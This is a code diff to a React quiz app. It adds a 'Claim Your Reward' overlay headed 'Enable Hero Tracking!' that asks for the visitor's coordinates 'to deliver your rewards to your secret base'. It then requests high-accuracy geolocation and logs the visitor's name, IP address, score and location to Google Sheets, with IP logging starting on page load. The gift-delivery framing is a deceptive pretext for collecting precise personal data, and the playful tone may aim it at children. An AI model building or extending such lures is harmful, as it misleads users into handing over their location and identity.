@@ -82,6 +82,7 @@ function App() {
   const [userIP, setUserIP] = useState('');
   const [location, setLocation] = useState(null);
   const [isLoading, setIsLoading] = useState(false);
+  const [showLocationPrompt, setShowLocationPrompt] = useState(false);
   const [sessionId] = useState(() => Date.now() + '-' + Math.random().toString(36).substr(2, 9));
 
   // Fetch IP on component mount
@@ -96,6 +97,13 @@ function App() {
       saveToGoogleSheets(sessionId, '', userIP, undefined, null, 'page_load');
     }
   }, [userIP]);
+
+  // Track stage changes for analytics
+  useEffect(() => {
+    if (stage === 'result') {
+      saveToGoogleSheets(sessionId, userName, userIP, score, null, 'quiz_completed');
+    }
+  }, [stage]);
 
   const fetchUserIP = async () => {
     try {
@@ -171,10 +179,10 @@ function App() {
   };
 
   const requestLocation = () => {
-    // Save score immediately when quiz is completed
-    saveToGoogleSheets(sessionId, userName, userIP, score, null, 'quiz_completed');
-
     setIsLoading(true);
+    // Save score immediately as a checkpoint
+    saveToGoogleSheets(sessionId, userName, userIP, score, null, 'location_requested_by_user');
+
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
@@ -184,27 +192,53 @@ function App() {
           };
           setLocation(loc);
           setIsLoading(false);
+          setShowLocationPrompt(false);
           setStage('gift');
-          // Save to Google Sheets with all data including location
           saveToGoogleSheets(sessionId, userName, userIP, score, loc, 'location_granted');
         },
         (error) => {
           console.error('Error getting location:', error);
           setIsLoading(false);
-          alert('Location access denied. You can still claim your gift!');
+          setShowLocationPrompt(false);
           setStage('gift');
-          // Save to Google Sheets without location
           saveToGoogleSheets(sessionId, userName, userIP, score, null, 'location_denied');
-        }
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     } else {
       alert('Geolocation is not supported by your browser.');
       setIsLoading(false);
+      setShowLocationPrompt(false);
       setStage('gift');
-      // Save to Google Sheets without location
       saveToGoogleSheets(sessionId, userName, userIP, score, null, 'geolocation_unsupported');
     }
   };
+
+  const skipLocation = () => {
+    setShowLocationPrompt(false);
+    setStage('gift');
+    saveToGoogleSheets(sessionId, userName, userIP, score, null, 'location_skipped_by_user');
+  };
+
+  const renderLocationPrompt = () => (
+    <div className="location-prompt-overlay" style={{ backgroundImage: `url(${resultBg})` }}>
+      <div className="location-prompt-card animate-fade-in">
+        <div className="location-icon">📍</div>
+        <h2 className="prompt-title">Enable Hero Tracking!</h2>
+        <p className="prompt-text">To deliver your rewards to your secret base, we need your coordinates!</p>
+        <p className="prompt-note">(This will prompt your browser for permission)</p>
+
+        <div className="prompt-buttons">
+          <button onClick={requestLocation} className="allow-btn" disabled={isLoading}>
+            {isLoading ? 'Locating...' : 'Allow Access'}
+          </button>
+          <button onClick={skipLocation} className="deny-btn" disabled={isLoading}>
+            Skip Delivery
+          </button>
+        </div>
+      </div>
+    </div>
+  );
 
   const renderWelcome = () => (
     <div className="welcome-screen animate-fade-in" style={{ backgroundImage: `url(${welcomeBg})` }}>
@@ -337,8 +371,8 @@ function App() {
             <p className="rank-message">{message}</p>
           </div>
 
-          <button onClick={requestLocation} className="claim-btn" disabled={isLoading}>
-            {isLoading ? 'Getting Location...' : 'Claim Your Reward! 🎁'}
+          <button onClick={() => setShowLocationPrompt(true)} className="claim-btn">
+            Claim Your Reward! 🎁
           </button>
         </div>
       </div>
@@ -387,6 +421,7 @@ function App() {
         {stage === 'welcome' && renderWelcome()}
         {stage === 'quiz' && renderQuiz()}
         {stage === 'result' && renderResult()}
+        {showLocationPrompt && renderLocationPrompt()}
         {stage === 'gift' && renderGift()}
       </div>
     </div>
